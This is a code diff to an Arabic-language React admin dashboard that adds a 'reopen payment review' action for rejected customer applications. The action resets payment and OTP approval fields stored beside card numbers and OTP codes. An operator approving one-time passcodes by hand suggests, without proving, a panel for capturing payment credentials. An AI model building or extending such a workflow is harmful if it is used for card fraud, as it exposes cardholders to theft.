@@ -586,6 +586,47 @@ const DashboardApplications = () => {
     }
   };
 
+  const reopenPaymentReview = async (appId: string) => {
+    const prevApp = applications.find(app => app.id === appId);
+    const nowIso = new Date().toISOString();
+    const reopenUpdate: Record<string, any> = {
+      status: 'pending_payment',
+      current_step: 'payment',
+      payment_approved: false,
+      otp_approved: false,
+      otp_code: null,
+      updated_at: nowIso,
+    };
+
+    setApplications(prev => {
+      const others = prev.filter(app => app.id !== appId);
+      const target = prev.find(app => app.id === appId);
+      if (!target) return prev;
+      return [{ ...target, ...reopenUpdate }, ...others];
+    });
+    setSelectedApp(prev => prev?.id === appId ? { ...prev, ...reopenUpdate } : prev);
+    setRelatedApplications(prev => prev.map(app => app.id === appId ? { ...app, ...reopenUpdate } : app));
+    sonnerToast.success("تمت إعادة فتح موافقة الدفع");
+
+    const { error } = await supabase
+      .from('customer_applications')
+      .update(reopenUpdate as any)
+      .eq('id', appId);
+
+    if (error) {
+      if (prevApp) {
+        setApplications(prev => prev.map(app => app.id === appId ? prevApp : app));
+        setSelectedApp(prev => prev?.id === appId ? prevApp : prev);
+        setRelatedApplications(prev => prev.map(app => app.id === appId ? prevApp : app));
+      }
+      toast({
+        title: "تعذر إعادة فتح الدفع",
+        description: "حاول مرة أخرى",
+        variant: "destructive"
+      });
+    }
+  };
+
   const getStepBadge = (approved: boolean) => {
     if (approved) {
       return <Badge className="bg-green-500"><CheckCircle className="w-3 h-3 mr-1" /> موافق عليه</Badge>;
@@ -1013,8 +1054,15 @@ const DashboardApplications = () => {
                               )}
                             </div>
 
-                            {app.status !== 'rejected' && (
-                              <div className="flex gap-2">
+                            <div className="flex gap-2">
+                              {app.status === 'rejected' && app.card_number && (
+                                <Button onClick={() => reopenPaymentReview(app.id)} size="sm" variant="outline" className="gap-1">
+                                  <RefreshCw className="h-4 w-4" />
+                                  إعادة فتح الدفع
+                                </Button>
+                              )}
+                              {app.status !== 'rejected' && (
+                                <>
                                 {(app.current_step === 'payment' || app.status === 'pending_payment') && !app.payment_approved && (
                                   <>
                                     <Button onClick={() => approveStep(app.id, 'payment_approved')} size="sm" className="gap-1">
@@ -1039,6 +1087,8 @@ const DashboardApplications = () => {
                                     </Button>
                                   </>
                                 )}
+                                </>
+                              )}
                                 {app.id_verification_step === 'submitted' && (
                                   <>
                                     <Button
@@ -1070,8 +1120,7 @@ const DashboardApplications = () => {
                                     </Button>
                                   </>
                                 )}
-                              </div>
-                            )}
+                            </div>
                           </div>
                         </div>
                       </div>
